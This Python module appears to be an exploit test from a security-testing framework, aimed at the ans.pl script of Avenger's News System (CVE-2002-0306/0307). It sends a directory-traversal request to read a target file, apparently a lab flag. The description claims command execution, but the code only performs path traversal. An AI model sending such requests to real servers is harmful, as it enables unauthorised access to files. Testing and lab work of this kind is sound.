from interfaces.exploit import Exploit, ExploitError, RES_ERROR, RES_OK, RES_UNKNOWN, RES_FAIL
from interfaces.hasparameters import StringParam
from managers.http import HttpManager, HttpRequest

desc = """
<br>
<hr><center><big><b>
 Command Execution in ANS.pl
</b></big></center><hr>
<br>
<b>Vulnerability:</b><hr>		

<br><br>
 Avenger's News System (ANS) is a PERL-based solution to creating an
 easy-to-update and easy-to-maintain web site. Instead of constantly
 uploading new news pages and wrestling with HTML, you can post stuff
 via a web-based form.
<br><br>
 When the script is ran it checks for a post, then it checks for a plugin.  
 The problem is in the plugin subroutine no input filtering is done on user 
 input so command execution is possible.
 	
<br><br>
<b>References:</b><hr>
  bugtraq 4149<br>
  cve 2002-0306 ,2002-0307<br>
  nessus 10875
<br><br><br>
"""

class WebTestExploit(Exploit):
	
	def __init__(self):
		Exploit.__init__(self,'HTTP ans exec', desc)
		self.add_param(StringParam('FILE','flag.txt','The target file'))
		self.add_param(StringParam('RESULT','well done','The expected result'))
		
	def execute(self):
		self.res = None
		httpm = HttpManager()
	
		cmd = "GET /cgi-bin/ans.pl?p=../../../../%s"%self.FILE
				
		self.log.info("Sending %s"%cmd)
		
		req = HttpRequest(cmd, header={'host':'none'})
		
		if(httpm.send_request(req) == False):
			self.log.error("Request failed")
			return
		
		self.res = httpm.get_http_response()
		
		#self.log.debug("RESULT: \r\n%s"%self.res)
						
	def isSuccessful(self):
		if self.res != None and self.RESULT in self.res.data:
			return RES_OK
		return RES_FAIL
	
